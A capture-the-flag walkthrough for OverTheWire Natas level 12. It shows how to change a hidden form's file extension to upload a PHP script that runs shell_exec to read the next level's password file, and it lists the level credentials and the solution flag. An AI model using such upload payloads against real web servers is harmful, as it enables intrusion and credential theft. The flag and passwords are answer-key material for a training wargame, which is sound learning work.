# Natas Level 12

Access data:

    username: natas12
    password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

Connect to the service using basic HTTP auth by replacing the credentials in the link:
    
    http://*USERNAME*:*FLAG*@*USERNAME*.natas.labs.overthewire.org/


In this challenge we can upload a file (expected to be an image). The filename will be replaced and it will be replaced within the webdirectory from the server. We can then go and visit our (expected to be an image) file clicking on the link.

Looking carefully at the source code we can observe, that the file extension is not generated dynamically - it is contained as a static hidden value in the form and therefore can easily be changed by an attacker. We know that the flag resides within /etc/natas_webpass/natas13. The idea is to create a PHP file, that prints out our flag.

Let's try renaming the random filename within the form from _prbn4epj6w.**jpg**_ to _prbn4epj6w.**php**_
```html
    <input type="hidden" name="filename" value="prbn4epj6w.php">
```
We also need to create a PHP file, that tries to print out the flag:

```php
    <?php
      $result = shell_exec("cat /etc/natas_webpass/natas13");
      print($result);
    ?>
```

Uploading this file and changing the file extension to PHP will give us a link where our file resides in the webdirectory. Visiting it will execute our PHP script and dump out the flag.


<details>
  <summary>Solution</summary>
  Flag: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
</details>